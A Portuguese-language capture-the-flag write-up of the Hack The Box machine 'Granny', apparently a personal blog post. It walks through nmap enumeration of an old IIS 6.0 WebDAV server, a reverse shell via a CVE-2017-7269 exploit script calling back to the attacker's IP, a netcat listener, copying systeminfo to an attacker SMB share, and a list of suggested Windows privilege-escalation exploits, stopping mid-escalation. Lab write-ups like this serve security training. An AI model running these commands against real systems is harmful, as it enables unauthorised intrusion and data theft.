---
title:     "Hack The Box -Granny"
tags: [windows,easy]
categories: HackTheBox
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/1.jpg)

## Enumeration

Iniciamos nossa maquina usando o nmap para enumeracao inicial

```
root@kali:~/HTB-Windows/granny# nmap -Pn -p- -oN nmap/allports_tcp 10.10.10.15
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 13:39 EDT
Stats: 0:07:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.87% done; ETC: 13:47 (0:00:01 remaining)
Nmap scan report for 10.10.10.15
Host is up (0.20s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 446.75 seconds
```

wowww apenas uma porta aberta ,,,,, 


```
root@kali:~/HTB-Windows/granny# nmap -sC -sV -p80 -oN nmap/scripts_default 10.10.10.15
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 13:49 EDT
Nmap scan report for 10.10.10.15
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Wed, 24 Jun 2020 17:52:36 GMT
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.30 seconds
```

A versao do webserver **(Microsoft IIS httpd 6.0)** eh bem antiga, alem disso no webdav temos diversos metodos habilitados **(|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK)**

Vamos continuar nossa enumeracao... Existe projeto bem interessante que desenvolveu um script bem interessante para buscar vulns usando o proprio nmap

**reference** https://medium.com/@alexander.tyutin/continuous-vulnerability-scanning-with-nmap-ea8821d587b0


```
root@kali:~/HTB-Windows/granny# git clone https://github.com/vulnersCom/nmap-vulners /usr/share/nmap/scripts/vulners
Cloning into '/usr/share/nmap/scripts/vulners'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 68 (delta 1), reused 0 (delta 0), pack-reused 62
Unpacking objects: 100% (68/68), 427.88 KiB | 550.00 KiB/s, done.
root@kali:~/HTB-Windows/granny# nmap --script-updatedb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 13:56 EDT
NSE: Updating rule database.
NSE: Script Database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.67 seconds
```

Usando e verificando os resultados obtidos

```
root@kali:~/HTB-Windows/granny# nmap -sV -Pn 10.10.10.15 --script=vulners/vulners.nse -p 80
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 14:01 EDT
Nmap scan report for 10.10.10.15
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| vulners: 
|   cpe:/a:microsoft:iis:6.0: 
|_      IIS_PHP_AUTH_BYPASS.NASL        7.5     https://vulners.com/nessus/IIS_PHP_AUTH_BYPASS.NASL
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.96 seconds
```

Bom, eu particulamente nao achei muito eficiente pra essa maquina.. Mas isso eh normal acontecer.. O recomendado eh voce testar nao so os scripts conhecidos mais outros tambem....

Continuando...

## Find Exploits

Pesquisando por exploit conhecidos no google, encontra rapidamente algumas exploracoes...

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/3.jpg)


## Reverse Shell

Rapidamente conseguimos obter nossa reverse shell

`python iis6CVE-2017-7269.py 10.10.10.15 80 10.10.14.36 53`

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/2.jpg)

## Privilege Escalation

Usando a velha estrategia e funcional ja encontramos alguns vetores

```
root@kali:~/HTB-Windows/granny# rlwrap nc -nlvp 53
listening on [any] 53 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.15] 1032
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

c:\windows\system32\inetsrv>
```

Precisamos obter mais informacoes basicas como qual sistema, qual arquitetura, qual versao essas informacoes sao essenciais para continuar com a escalacao de privilegios

`impacket-smbserver tools .`
`systeminfo >> \\10.10.14.36\tools\systeminfo.txt`

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/4.jpg)

```

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 49 Minutes, 58 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
```

Como podemos obervar eh um versao do windows SUPER antiga **Microsoft(R) Windows(R) Server 2003, Standard Edition** e tem varios exploits sem duvidas kk

Usando o windows-exploit-suggester.py podemos obter uma lista com sugestoes de exploracao..

```
initiating winsploit version 3.3...
database file detected as xls or xlsx based on extension
attempting to read from the systeminfo input file
systeminfo input file read successfully (ascii)
querying database file for potential vulnerabilities
comparing the 0 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
there are now 356 remaining vulns
searching for local exploits only
[E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
windows version identified as 'Windows 2003 SP2 32-bit'

MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
  https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
  https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF

MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
  http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC

MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
  http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC

MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
  http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
  http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation

MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
  https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
  https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC

MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
  http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC

MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
done
```

Tentei o primeiro da lista **MS15-051** de resultados, no entanto, a maquina de pau 

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/5.jpg)

Vou tentar o MS14-068 (Critical), ja que o anterior era apenas (Important)

Mas tambem nao tive sucesso...

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/6.jpg)

Esse funcionou mas spawnou uma shell e entao vou tentar add um user e usar o runas para fazer login o algo nesse sentidoo

